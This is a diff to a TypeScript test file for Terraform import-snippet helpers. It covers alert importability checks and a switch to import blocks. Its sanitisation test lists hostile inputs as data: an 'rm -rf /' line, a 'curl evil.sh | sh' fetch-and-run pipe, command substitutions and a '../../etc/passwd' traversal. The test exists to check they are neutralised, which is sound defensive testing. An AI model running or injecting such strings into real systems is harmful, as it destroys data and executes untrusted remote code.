@@ -1,8 +1,9 @@
 import {
-  buildImportCommand,
+  buildImportBlock,
   buildImportFile,
   collectImportableResources,
   type IacImportManifest,
+  isImportableAlert,
   terraformResourceLabel,
 } from '@/components/Iac/terraformSnippets';
 
@@ -32,13 +33,66 @@ describe('terraformResourceLabel', () => {
   });
 });
 
-describe('buildImportCommand', () => {
-  it('emits the plain-id import form (never <teamId>/<id>)', () => {
+// The alerts page and the bulk export both gate on this, so it is the single
+// definition of "can the provider model this alert".
+describe('isImportableAlert', () => {
+  it('accepts a saved-search alert', () => {
     expect(
-      buildImportCommand({ type: 'dashboard', id: ID, name: 'HyperDX Usage' }),
-    ).toBe(
-      `terraform import clickhouse_clickstack_dashboard.hyperdx_usage_3f4f4 ${ID}`,
+      isImportableAlert({ source: 'saved_search', savedSearchId: ID }),
+    ).toBe(true);
+  });
+
+  it('rejects a tile alert', () => {
+    expect(isImportableAlert({ source: 'tile' })).toBe(false);
+  });
+
+  it('rejects an alert with no source and no saved search', () => {
+    expect(isImportableAlert({})).toBe(false);
+  });
+
+  // Reachable, not hypothetical: converting a saved-search alert to a tile
+  // alert leaves the old savedSearch behind, because `makeAlert` passes
+  // `savedSearch: undefined` and Mongoose 6 strips undefined from the `$set`.
+  // An unconditional `||` fallback would wrongly offer this for import.
+  it('rejects a tile alert carrying a stale savedSearchId', () => {
+    expect(isImportableAlert({ source: 'tile', savedSearchId: ID })).toBe(
+      false,
     );
+  });
+
+  // Legacy rows predate the `source` discriminator; a saved-search reference
+  // is enough to identify them.
+  it('accepts a legacy alert that only carries a savedSearchId', () => {
+    expect(isImportableAlert({ savedSearchId: ID })).toBe(true);
+  });
+});
+
+describe('buildImportBlock', () => {
+  // The block form, not the CLI `terraform import` one-liner: the CLI form
+  // refuses to run unless the address is already declared in configuration,
+  // and this feature generates none.
+  it('emits an import block with the plain-id form (never <teamId>/<id>)', () => {
+    expect(
+      buildImportBlock({ type: 'dashboard', id: ID, name: 'HyperDX Usage' }),
+    ).toBe(
+      `import {\n  to = clickhouse_clickstack_dashboard.hyperdx_usage_3f4f4\n  id = "${ID}"\n}`,
+    );
+  });
+});
+
+// The slugifier is the only control keeping a copy-pasted snippet safe, so
+// relaxing it must fail loudly.
+describe('terraformResourceLabel sanitisation', () => {
+  it.each([
+    'x\nrm -rf /; echo',
+    'a"; curl evil.sh | sh; #',
+    '$(whoami)',
+    '`id`',
+    '../../etc/passwd',
+  ])('collapses hostile input to a safe label: %s', hostile => {
+    expect(
+      terraformResourceLabel({ type: 'alert', id: ID, name: hostile }),
+    ).toMatch(/^[a-z][a-z0-9_]*$/);
   });
 });
 
